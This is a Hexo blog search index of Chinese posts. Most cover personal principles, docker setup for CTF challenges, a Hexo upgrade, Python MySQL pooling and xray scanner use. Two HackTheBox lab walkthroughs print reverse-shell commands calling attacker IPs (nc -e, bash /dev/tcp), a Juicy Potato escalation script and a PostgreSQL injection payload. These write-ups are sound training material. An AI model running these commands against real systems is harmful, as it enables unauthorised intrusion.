<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>个人原则宪法</title>
    <link href="/2099/12/31/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/"/>
    <url>/2099/12/31/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>史蒂芬.柯维提出，以原则为导向是以终为始最有效的方法。</p><blockquote><p>李源在解读查理.芒格时说，芒格的思维方式解决了他一直以来困惑的“愚人船”命题——一群人在船舱里掌舵，但他们看不清前方；另一群人在岸上，他们能看见一切，想要为船指引方向，但是无论他们如何叫喊，船里的人都听不见。生活就像一艘愚人船，掌舵人代表过去的我们，岸上的人代表现在的我们。现在我们了解过去，却无法为过去的我们指引方向。芒格不仅是成功的投资大师，更是生活的智者，他总结了一系列“为”与“不为”的清单，作为自己的投资原则。</p><p>作者：土月君<br>链接：<a href="https://www.jianshu.com/p/7cd520b68d5e">https://www.jianshu.com/p/7cd520b68d5e</a><br>来源：简书</p></blockquote><p>1.保持忠诚，不出轨，不搞暧昧，矛盾冲突通过有效沟通解决。</p><p>2.保持冷静，在愤怒的时候，不出口伤人，不动手伤人，保持深呼吸，直至缓解。</p><p>3.保持学习，尊崇内心的追寻和梦想，不卑不亢，独立思考。</p><p>4.保持爱心，珍惜所拥有的东西，尽可能做到节约。</p><p>5.开源节流，不花无意义的钱，购物前都思考是否必要，是否必须，尽早达到退休存款的4.2%为年开销。</p><p>6.享受生活，享受人生，高光时期不高傲，低谷时期不绝望，珍惜每一天。</p><p>7.保持自信，相信自己，相信亲近的人，相信爱人。</p><blockquote><p>2020/2/8 2:35 第一版</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>个人原则宪法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用docker为pwn题目搭配环境</title>
    <link href="/2021/04/25/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/"/>
    <url>/2021/04/25/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>date: 2020/01/13 23:06:39<br>categories:<br>    - CTF<br>    - 运维</p><hr><h2 id="将多个题目搭建一个docker里"><a href="#将多个题目搭建一个docker里" class="headerlink" title="将多个题目搭建一个docker里"></a>将多个题目搭建一个docker里</h2><p>ubuntu *1 </p><p>docker <a href="https://www.runoob.com/docker/ubuntu-docker-install.html">安装</a></p><p>docker-compose <a href="https://docs.docker.com/compose/install/">官方文档</a></p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch/pwn_deploy_chroot</a></p><p><a href="https://blog.csdn.net/xiojing825/article/details/79494408">解决 ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><p><a href="https://www.awaimai.com/2587.html">docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>将题目放到bin目录中</p><p>然后在config.py，将REPLACE_BINSH设置为False</p><p>运行一次python initialize.py</p><p>然后会出现一个flags.txt（如果想替换flag，就直接修改flag.txt里的flag字符串即可，然后运行一次python initialize.py）</p><p>然后运行 docker-compose up -build -d</p><p>开启题目即可</p><p>注意：若出现libstdc++.so.6找不到的情况，说明C++环境没有配好，只需要在已经配好C++环境的同版本ubuntu下找到libstdc++.so.6.0.XX（XX为数字）和libgcc_s.so.1放到pwn_deploy_chroot目录下，然后在dockerfile里加入一下代码</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&gt;<span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/libstdc++.so.6.0.21 /u</span>sr<span class="hljs-regexp">/lib/</span>libstdc++.so.<span class="hljs-number">6</span><br>&gt;<span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/libgcc_s.so.1 /u</span>sr<span class="hljs-regexp">/lib/</span>libgcc_s.so.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>来源:<a href="https://196011564.github.io/2019/07/22/Linux-简单PWN搭建/?tdsourcetag=s_pctim_aiomsg#找到Pwn所在的端口">咲夜南梦</a></p></blockquote><p>停止容器 docker stop name</p><h2 id="一个题目一个docker"><a href="#一个题目一个docker" class="headerlink" title="一个题目一个docker"></a>一个题目一个docker</h2><p><a href="https://github.com/glzjin/base_pwn_xinetd">ubuntu16</a></p><p><a href="https://github.com/glzjin/base_pwn_xinetd_kafel_1804">ubuntu18</a></p><p>一般情况下，使用赵师傅Ubuntu18.04环境的docker镜像</p><p>下载下来之后，删除除了文件夹：src，文件：docker-compose.yml，Dockerfile以外的所有文件，并复制多个以供其它题目使用</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Shield .29</title>
    <link href="/2021/04/19/HackTheBox%20Starting%20Point%20Shield%20.29/"/>
    <url>/2021/04/19/HackTheBox%20Starting%20Point%20Shield%20.29/</url>
    
    <content type="html"><![CDATA[<p>扫描出来80 ISS和 3306 mysql</p><p>bp发现路径下有wordpress</p><p>查看wordpress版本，网页搜索<code>generator</code>即可搜到<code>generator</code></p><p>wordpress 登陆界面，使用看到的admin账户和先前的密码登录即可。</p><p>使用msf的<code>exploit/unix/webapp/wp_admin_shell_upload</code>就可以获得meterpreter shell，注意要设置LHOSTS不然弹不回来</p><blockquote><p><img src="../RelatedBox/Metasploit%20%E4%BB%8B%E7%BB%8D.md#Meterpreter" alt="Meterpreter"></p></blockquote><p><code>cd C:/inetpub/wwwroot/wordpress/wp-content/uploads</code></p><p>在<code>\wordpress\wp-content\uploads</code>目录下上传nc<br><code>upload /home/kali/Desktop/tools/windows-exe/nc.exe</code></p><p>反弹shell<code>execute -f nc.exe -a &quot;-e cmd.exe 10.10.14.87 4444&quot;</code></p><p>这里我傻了端口跟msf的meterpreter重复了，所以获取不到shell，并且nc也不支持-e。。。</p><p>使用<a href="https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip">这个</a>可以</p><p>在metepreter里可以使用<code>sysinfo</code>查看os信息</p><p>查看到windowsserver2016 可以使用 <a href="https://github.com/ohpe/juicy-potato">这个</a></p><p>上传一个内容为</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">START</span> C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">87</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p>的bat脚本</p><p><code>upload /home/kali/Desktop/HTB/StartingPoint/29/shell.bat</code></p><p>随后，先监听新的端口<code>nc -lvp 1111</code><br>在第一次获取的shell中<code>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337</code></p><p>成功即可获得admin权限的powershell</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>win移动要使用/ / /，不能简单复制linux的\ \ \ \ </p><p>一般恶意软件需要改名，不然更容易被defender识别</p><p>msf获取的shell感觉不是特别的稳定</p><p>这应该叫使用cve获取高权限再反弹出来</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting point Vaccine .46</title>
    <link href="/2021/04/19/HackTheBox%20Starting%20point%20Vaccine%20.46/"/>
    <url>/2021/04/19/HackTheBox%20Starting%20point%20Vaccine%20.46/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描之后有ftp，ssh和web</p><p>联想到之前获得的ftp账户，输入进去登录后获得了backup.zip</p><p>使用Seclist的字典，通过爆破获得密码，成功登陆进的了后台</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>获得登陆密码的md5，解开后登陆进后台跳转到dashboard</p><p>推测登陆页面sql为select * from table where name = Input，输入<code>sport&#39;+and+1=1</code>，根据页面返回的报错信息<code>ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: Select * from cars where name ilike &#39;%sport&#39; and 1=1%&#39; ^</code></p><p>xray扫描结果</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs swift">[<span class="hljs-type">Vuln</span>: sqldet]<br><span class="hljs-type">Target</span>           <span class="hljs-string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span>       <br><span class="hljs-type">VulnType</span>         <span class="hljs-string">&quot;blind-based/default&quot;</span>                            <br><span class="hljs-type">Payload</span>          <span class="hljs-string">&quot;1&#x27;/**/and(select&#x27;1&#x27;from/**/pg_sleep(2))&gt;&#x27;0&quot;</span> <br><span class="hljs-type">Position</span>         <span class="hljs-string">&quot;query&quot;</span>                                       <br><span class="hljs-type">ParamKey</span>         <span class="hljs-string">&quot;search&quot;</span>                                        <br><span class="hljs-type">ParamValue</span>       <span class="hljs-string">&quot;1&#x27;/**/and(select&#x27;1&#x27;from/**/pg_sleep(2))&gt;&#x27;0&quot;</span>   <br>std_dev          <span class="hljs-string">&quot;5&quot;</span>                                          <br>sleep_time       <span class="hljs-string">&quot;2000&quot;</span>                                       <br>p_time           <span class="hljs-string">&quot;187&quot;</span>                                       <br>n_time           <span class="hljs-string">&quot;2191&quot;</span>                                           <br>stat             <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>normal<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[193,187,200,194,184,194],<span class="hljs-subst">\&quot;</span>avg<span class="hljs-subst">\&quot;</span>:192,<span class="hljs-subst">\&quot;</span>std_dev<span class="hljs-subst">\&quot;</span>:5.196152422706632,<span class="hljs-subst">\&quot;</span>sleep_time<span class="hljs-subst">\&quot;</span>:2&#125;,<span class="hljs-subst">\&quot;</span>sleep_0_time<span class="hljs-subst">\&quot;</span>:187,<span class="hljs-subst">\&quot;</span>quick_check<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[2191],<span class="hljs-subst">\&quot;</span>sleep<span class="hljs-subst">\&quot;</span>:2&#125;,<span class="hljs-subst">\&quot;</span>verify<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[3189,3193,3189],<span class="hljs-subst">\&quot;</span>sleep<span class="hljs-subst">\&quot;</span>:3&#125;&#125;&quot;</span>                                                                                                <br>title            <span class="hljs-string">&quot;Generic PostgreSQL time based case [&#x27;string&#x27;]&quot;</span>                     <br>type             <span class="hljs-string">&quot;time_based&quot;</span>                               <br>avg_time         <span class="hljs-string">&quot;192&quot;</span>   <br></code></pre></td></tr></table></figure><p>这里因为sqlmap的cookie弄错了绕了弯路。。配置对的sqlmap直接就能检测到sql注入并获得shell</p><p>查看<code>/var/www/html/dashboard.php</code>后获得密码<code>P@s5w0rd!</code></p><p>获得os-shell之后反弹shell<br><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.180/4444 0&gt;&amp;1&#39;</code></p><p><code>sudo -l</code> 列出经过安全策列允许的指令</p><p>将简单shell变成tty</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">SHELL=<span class="hljs-regexp">/bin/</span>bash script -q <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br>python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><p>ftp的使用</p><p>爆破密码</p><p>postgresql 注入和使用</p><p>sqlmap</p><p>apache的配置文件获取账密</p><p>使用vi提权</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo再升级</title>
    <link href="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/"/>
    <url>/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<p>从4.2.1到5.4.0<br>Warning: 更新后front-matter十分严格，我又改了好久脚本。。。。嫌麻烦的请不要更新，又不是不能用.jpg</p><p>hexo目录下查看版本</p><img src="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/Snipaste_2021-04-02_14-01-39.png" class=""><p>直接修改 hexo init 目录下的package.json的</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;dependencies&quot;</span>: &#123;<br><br> <span class="hljs-string">&quot;hexo&quot;</span>: <span class="hljs-string">&quot;^5.4.0&quot;</span>,<br> &#125;<br></code></pre></td></tr></table></figure><p>然后npm update即可</p><img src="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/Snipaste_2021-04-02_14-02-22.png" class=""><blockquote><p><code>use_date_for_updated</code> is deprecated and will be removed in next major version. Please use <code>updated_option: &#39;date&#39;</code> instead. 这个在  _config.yml里修改</p></blockquote><p>报错<br><code>err: Error: Function yaml.safeLoad is removed in js-yaml 4. Use yaml.load instead, which is now safe by default.</code></p><p>fluid的配置文件，更新到hexo 5.0后也发生了变化 <a href="https://hexo.fluid-dev.com/docs/guide/#%E8%A6%86%E7%9B%96%E9%85%8D%E7%BD%AE">配置指南 | Hexo Fluid</a></p><p>简单地说就是删除掉<code>\source\_data\fluid_config.yml</code>即可</p><p>版本更新改动，这个跟着改一下就好了<br>_config.yml: banner_parallax 变更为层级关系（为了配合新功能）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">banner_parallax:</span> <span class="hljs-literal">true</span><br><span class="hljs-string">+</span> <span class="hljs-attr">banner:</span><br><span class="hljs-string">+</span>   <span class="hljs-attr">parallax:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>其他的就是按照以前的fluid_config配置和修改啦</p><h2 id="坑：文章title空白"><a href="#坑：文章title空白" class="headerlink" title="坑：文章title空白"></a>坑：文章title空白</h2><p>因为front-matter的title没写。。。从脚本加了自动补上</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python线程池读写mysql</title>
    <link href="/2021/03/21/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/"/>
    <url>/2021/03/21/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/</url>
    
    <content type="html"><![CDATA[<p>基于mysql-connector-python，主要是因为一次函数调用有七个select语句，而一共有3w8次7个select，原先要跑两天才能跑完。先吐槽一波mysql connector的库文档，关闭连接啥的不和建立连接放一起，找了老久最后百度出来的。。</p><h2 id="mysql连接池"><a href="#mysql连接池" class="headerlink" title="mysql连接池"></a>mysql连接池</h2><p>建立连接池</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> mysql.connector import pooling<br>mydb = pooling.MySQLConnectionPool(<br>            <span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;localhost&quot;</span>,<br>            <span class="hljs-attribute">user</span>=<span class="hljs-string">&quot;root&quot;</span>,<br>            <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;xxx&quot;</span>,<br>            <span class="hljs-attribute">database</span>=<span class="hljs-string">&quot;xxxxx&quot;</span>,<br>            <span class="hljs-attribute">auth_plugin</span>=<span class="hljs-string">&#x27;mysql_native_password&#x27;</span>,<br>            <span class="hljs-attribute">pool_name</span>=<span class="hljs-string">&#x27;test&#x27;</span>,<br>            <span class="hljs-attribute">pool_size</span>=32<br>        )<br></code></pre></td></tr></table></figure><p>申请连接，获得游标，关闭游标和连接</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">thread_connection = mydb<span class="hljs-selector-class">.get_connection</span>()<br>mycursor = thread_connection<span class="hljs-selector-class">.cursor</span>()<br><br>mycursor<span class="hljs-selector-class">.close</span>()<br>thread_connection<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p><a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html">concurrent.futures — 启动并行任务 — Python 3.9.2 文档</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> concurrent.futures.thread <span class="hljs-keyword">import</span> ThreadPoolExecutor<br>pool = ThreadPoolExecutor(<span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>一开始我用的<code>submit()</code>，这样会导致mysql连接池被耗尽并且还没有任何报错的情况（调试也不好发现问题在哪），翻看文档后用了<code>map</code></p><blockquote><p><code>map</code>(<em>func</em>, <em>*iterables</em>, <em>timeout=None</em>, <em>chunksize=1</em>)<a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.Executor.map" title="永久链接至目标"></a><br>类似于 <a href="https://docs.python.org/zh-cn/3/library/functions.html#map" title="map"><code>map(func, *iterables)</code></a> 函数，除了以下两点：</p><ul><li><em>iterables</em> 是立即执行而不是延迟执行的；</li><li><em>func</em> 是异步执行的，对 <em>func</em> 的多个调用可以并发执行。</li></ul><p>如果 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#iterator.__next__" title="iterator.__next__"><code>__next__()</code></a> 已被调用且返回的结果在对 <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.Executor.map" title="concurrent.futures.Executor.map"><code>Executor.map()</code></a> 的原始调用经过 <em>timeout</em> 秒后还不可用，则已返回的迭代器将引发 <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.TimeoutError" title="concurrent.futures.TimeoutError"><code>concurrent.futures.TimeoutError</code></a>。 <em>timeout</em> 可以为 int 或 float 类型。 如果 <em>timeout</em> 未指定或为 <code>None</code>，则不限制等待时间。<br>如果 <em>func</em> 调用引发一个异常，当从迭代器中取回它的值时这个异常将被引发。<br>使用 <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor" title="concurrent.futures.ProcessPoolExecutor"><code>ProcessPoolExecutor</code></a> 时，这个方法会将 <em>iterables</em> 分割任务块并作为独立的任务并提交到执行池中。这些块的大概数量可以由 <em>chunksize</em> 指定正整数设置。 对很长的迭代器来说，使用大的 <em>chunksize</em> 值比默认值 1 能显著地提高性能。 <em>chunksize</em> 对 <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.ThreadPoolExecutor" title="concurrent.futures.ThreadPoolExecutor"><code>ThreadPoolExecutor</code></a> 没有效果。</p></blockquote><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">userlist = list(xxx)<span class="hljs-meta">#*iterables的要</span><br>pool = ThreadPoolExecutor(<span class="hljs-number">16</span>)<br>result = pool.map(select_function, userlist)<br><span class="hljs-keyword">count</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> result:<span class="hljs-meta">#线程正常完成会返回None，print(r)可以帮助调试</span><br>    <span class="hljs-keyword">count</span> += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-keyword">count</span>) + <span class="hljs-string">&quot; in &quot;</span> + <span class="hljs-built_in">str</span>(len(userlist)))<br></code></pre></td></tr></table></figure><p>这里选择16，是因为填32会崩，索性直接砍半了。最后再展示一下mysql的情况</p><img src="/2021/03/21/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/Snipaste_2021-03-21_20-25-58.png" class=""><h2 id="性能测试对比"><a href="#性能测试对比" class="headerlink" title="性能测试对比"></a>性能测试对比</h2><p>库里一共有6w条记录，for循环的话要死人了，所以只测1000条时候的速度</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">date &amp;&amp; <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 ./</span>test.py &amp;&amp; date <br>日  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">36</span>:<span class="hljs-number">01</span> CST <span class="hljs-number">2021</span><br>日  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">36</span>:<span class="hljs-number">24</span> CST <span class="hljs-number">2021</span><br></code></pre></td></tr></table></figure><p>23秒，然后for循环</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">date &amp;&amp; <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 ./</span>test.py &amp;&amp; date <br>日  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">43</span>:<span class="hljs-number">57</span> CST <span class="hljs-number">2021</span><br>日  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">13</span> CST <span class="hljs-number">2021</span><br></code></pre></td></tr></table></figure><p>1分16秒</p><p>暂时够用了👨‍💻</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Xray 社区版 再学习记录</title>
    <link href="/2021/03/12/Xray%20%E7%A4%BE%E5%8C%BA%E7%89%88%20%E5%86%8D%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/03/12/Xray%20%E7%A4%BE%E5%8C%BA%E7%89%88%20%E5%86%8D%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前也有用xray扫扫学校的漏洞，最近有在开发自己的扫描平台，估借此机会再学习。</p><p><a href="https://docs.xray.cool/#/README">官方文档</a></p><p>VulnType的复现在最后边。</p><h2 id="三种基本模式"><a href="#三种基本模式" class="headerlink" title="三种基本模式"></a>三种基本模式</h2><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>初始配置证书部分看官方文档吧Orz， <a href="https://docs.xray.cool/#/tutorial/webscan_proxy">代理模式进行扫描 - xray 安全评估工具文档</a></p><p>建议配合 SwitchyOmega 这个插件使用，可以随意切换代理服务器及端口。</p><p><code>config.yaml</code>配置好</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mitm:<br>  restriction: <span class="hljs-meta"># 代理能够访问的资源限制, 以下各项为空表示不限制</span><br>    hostname_allowed: [&#x27;*.web-security-academy.net&#x27;,&#x27;192.168.3.188&#x27;] <span class="hljs-meta"># 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br></code></pre></td></tr></table></figure><p>然后游览页面即可，若没有<code>config.yaml</code>则先运行一次xray</p><h3 id="基础爬虫模式"><a href="#基础爬虫模式" class="headerlink" title="基础爬虫模式"></a>基础爬虫模式</h3><blockquote><p>爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点</p><ul><li>xray 的基础爬虫不能处理 js 渲染的页面</li></ul></blockquote><p><code>./xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</code></p><h4 id="配置Cookie"><a href="#配置Cookie" class="headerlink" title="配置Cookie"></a>配置Cookie</h4><p>配置文件<code>config.yaml</code>里，<code>http</code> 配置部分的 <code>headers</code> 项:</p><p>添加一条Cookie，如</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">headers:</span><br><span class="hljs-symbol">  Cookie:</span> key=value<br></code></pre></td></tr></table></figure><p>例子</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><br>  ...<br> <br><span class="hljs-symbol">  headers:</span><br><span class="hljs-symbol">    Cookie:</span> sysauth=xxxxx<br></code></pre></td></tr></table></figure><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><blockquote><p>目前主要是服务扫描相关的poc，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测 poc。</p></blockquote><p>target参数支持ip:port方式，和 xxx.file方式</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./xray</span> servicescan <span class="hljs-params">--target</span> 127.0.0.1<span class="hljs-function">:8009</span><br><span class="hljs-string">./xray</span> servicescan <span class="hljs-params">--target</span> xxx.file<br></code></pre></td></tr></table></figure><p>xxx.file格式，一行一个ip:port目标，进行批量导入</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8009</span><br><span class="hljs-number">10.1.1.1:8099</span><br></code></pre></td></tr></table></figure><p>可以使用如下不同的导出方式</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">NAME:<br>    servicescan - Run a service scan task<br><br>USAGE:<br>    servicescan [command <span class="hljs-meta">options</span>] [arguments...]<br><br><span class="hljs-meta">OPTIONS</span>:<br>   --target value          指定单一目标，例子: host:8009<br>   --target-<span class="hljs-meta">file</span> value     从文件加载目标，一目标一行<br>   --json-<span class="hljs-meta">output</span> <span class="hljs-meta">FILE</span>      使用json格式导出xray结果<br>   --webhook-<span class="hljs-meta">output</span> value  用json格式post xray结果到某url<br>   --html-<span class="hljs-meta">output</span> <span class="hljs-meta">FILE</span>      用html格式导出报告<br></code></pre></td></tr></table></figure><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="HTTP-配置"><a href="#HTTP-配置" class="headerlink" title="HTTP 配置"></a>HTTP 配置</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><br><span class="hljs-symbol">  proxy:</span> <span class="hljs-string">&quot;&quot;</span>                             <span class="hljs-meta"># 漏洞扫描时使用的代理，如: http:<span class="hljs-comment">//127.0.0.1:8080。 如需设置多个代理，请使用 proxy_rule 或自行创建上层代理</span></span><br><span class="hljs-symbol">  proxy_rule:</span> []                        <span class="hljs-meta"># 漏洞扫描使用多个代理的配置规则, 具体请参照文档</span><br></code></pre></td></tr></table></figure><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>支持 <code>http</code>, <code>https</code> 和 <code>socks5</code> 三种格式，如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span 